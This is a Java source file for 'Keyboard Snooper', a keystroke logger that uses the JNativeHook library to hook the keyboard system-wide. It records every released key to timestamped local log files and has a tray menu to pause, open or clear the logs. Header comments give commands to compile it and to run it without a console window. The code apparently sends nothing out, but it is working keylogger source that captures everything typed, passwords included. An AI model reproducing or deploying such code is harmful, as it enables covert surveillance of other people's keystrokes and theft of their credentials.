import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyAdapter;

import java.util.logging.*;
import java.io.*;
import java.awt.*;
import java.awt.event.*;

//COMPILE: javac -cp ".;lib/jnativehook-2.1.0.jar;" Snooper.java
//RUN: java -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
//RUN without console: javaw -cp ".;lib/jnativehook-2.1.0.jar;" Snooper
public class Snooper extends NativeKeyAdapter {
  
	public static final String FOLDER = "snoop_log";
	public static final String DASH = "/";
	public static final String START_NAME = "log_";
	public static final String EXTENSION_NAME = ".slog";
	public static final int SECOND_IN_MILLI = 1_000;
	public static final int HOUR_IN_MILLI = SECOND_IN_MILLI * 60 * 60;
	public static final String fileNameFormat = "yyyyMMddHHmmssSSSS";
	public static final String perHourFormat = "yyyy, MM dd, h:mma";
	public static final String TITLE = "Keyboard Snooper";
	public static final String AUTHOR = "doppelgunner";

	private File folderFile;
	private File keyStrokesFile;
	private File tempFile;
	private String keyStrokesFilePath;
	private String tempFilePath;
	
	private String startDate;
	
	private javax.swing.Timer flushTimer;
	private javax.swing.Timer perHourTimer;
	
	private BufferedWriter bWriter;
	
	private boolean wroteSomething;
	
	private TrayIcon trayIcon;
	private SystemTray tray;
	private PopupMenu popup;
	
	private boolean paused = false;
	
	public Snooper() {
		init();
		initSystemTray();
		start();
	}
	
	//init of the base of the program
	public void init() {
		folderFile = new File(FOLDER);
		startDate = Util.getCurrentDate(fileNameFormat);
		keyStrokesFilePath = FOLDER + DASH + START_NAME + startDate + EXTENSION_NAME;
		keyStrokesFile = new File(keyStrokesFilePath);
		tempFilePath = FOLDER + DASH + START_NAME + "temp" + EXTENSION_NAME;
		
		if (Util.hasInstance(tempFilePath)) {
			System.exit(0); //exit app if already has a temp file to log into
		}
		
		tempFile = Util.createFile(tempFilePath);
		
		try {
			bWriter = new BufferedWriter(new FileWriter(tempFile));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		Runtime.getRuntime().addShutdownHook(new Thread(()-> {
			dispose();
		}));
		
		flushTimer = new javax.swing.Timer(SECOND_IN_MILLI, e-> {
			try {
				if (wroteSomething) {
					wroteSomething = false;
					bWriter.flush();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
		
		perHourTimer = new javax.swing.Timer(HOUR_IN_MILLI, e-> {
			try {
				logFile(Util.getHourly());
				flushData();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
	}
	
	public void logFile(String s) {
		try {
			bWriter.write(s);
			bWriter.newLine();
			bWriter.flush(); 
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void flushData() {
		try {
			bWriter.flush(); 
		} catch (Exception ex) {
			ex.printStackTrace();
		} 
	}
	
	//init of system tray
	public void initSystemTray() {
		if (!SystemTray.isSupported()) {
			System.err.println("System tray is not supported");
		}
		tray = SystemTray.getSystemTray();
		trayIcon = new TrayIcon(Util.createImage("images/snooper.png","Keyboard Snooper"));
		try {
			tray.add(trayIcon);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		popup = new PopupMenu();
		MenuItem about = new MenuItem("About");
		MenuItem pause = new MenuItem("Pause");
		MenuItem openCurrentFolder = new MenuItem("Open current folder");
		MenuItem openCurrentLog = new MenuItem("Open current log");
		MenuItem clearCurrentLog = new MenuItem("Clear current log");
		CheckboxMenuItem iconAutoSize = new CheckboxMenuItem("Icon image auto size");
		MenuItem exit = new MenuItem("Exit");
		
		popup.add(about);
		popup.addSeparator();
		popup.add(pause);
		popup.add(openCurrentFolder);
		popup.add(openCurrentLog);
		popup.add(clearCurrentLog);
		popup.add(iconAutoSize);
		popup.addSeparator();
		popup.add(exit);
		
		trayIcon.setImageAutoSize(true);
		iconAutoSize.setState(true);
		
		trayIcon.setToolTip("Keyboard Snooper");
		trayIcon.setPopupMenu(popup);
		
		trayIcon.addActionListener(event -> {
			KSApplication.show();
		});
		
		about.addActionListener(event -> {
			trayIcon.displayMessage(TITLE, "by " + AUTHOR, TrayIcon.MessageType.NONE);
		});
		
		pause.addActionListener(event -> {
			paused = !paused;
			if (paused) {
				trayIcon.displayMessage(TITLE, "Pausing...", TrayIcon.MessageType.NONE);
				pause.setLabel("Continue");
			} else {
				trayIcon.displayMessage(TITLE, "Continuing...", TrayIcon.MessageType.NONE);
				pause.setLabel("Pause");
			}
		});
		
		openCurrentFolder.addActionListener(event -> {
			try {
				Desktop.getDesktop().open(folderFile);
			} catch (Exception ex) {
				trayIcon.displayMessage(TITLE, "Error opening current log folder..." + AUTHOR, TrayIcon.MessageType.NONE);
			}
		});
		
		openCurrentLog.addActionListener(event -> {
			try {
				Desktop.getDesktop().open(tempFile);
			} catch (Exception ex) {
				trayIcon.displayMessage(TITLE, "Error opening current log...", TrayIcon.MessageType.NONE);
			}
		});
		
		clearCurrentLog.addActionListener(event -> {
			try {
				trayIcon.displayMessage(TITLE, "Overwriting temp log...", TrayIcon.MessageType.NONE);
				bWriter.close();
				tempFile = Util.createFile(tempFilePath);
				bWriter = new BufferedWriter(new FileWriter(tempFile));
				logFile(Util.getHourly());
			} catch (Exception ex) {
				trayIcon.displayMessage(TITLE, "Error clearing current log...", TrayIcon.MessageType.NONE);
			}
		});
		
		iconAutoSize.addItemListener(event -> {
			int type = event.getStateChange();
			if (type == ItemEvent.SELECTED) {
				trayIcon.setImageAutoSize(true);
			} else {
				trayIcon.setImageAutoSize(false);
			}
		});
		
		exit.addActionListener(e -> {
			trayIcon.displayMessage(TITLE, "Exiting ...", TrayIcon.MessageType.NONE);
			tray.remove(trayIcon);
			System.exit(0);
		});
	}
	
	//starts the timer of the program
	public void start() {
		//start the timers
		flushTimer.start();
		perHourTimer.setInitialDelay(0);
		perHourTimer.start();
		
		trayIcon.displayMessage(TITLE, "Starting ...", TrayIcon.MessageType.NONE);
	}
	
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
			if (bWriter == null || paused) return;
			logFile(NativeKeyEvent.getKeyText(e.getKeyCode()));
			wroteSomething = true;
		} catch(Exception ex) {
			ex.printStackTrace();
		}
    }

    public static void main(String[] args) {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Snooper());
		
		KSApplication.main(args);
    }
	
	//called when the program is aout to exit or shutdown
	public void dispose() {
		try {
			if (bWriter != null) {
				bWriter.close();
			}
			tempFile.renameTo(keyStrokesFile);
		} catch (Exception ex) {
			System.err.println("Error: closing stream");
		}
	}
}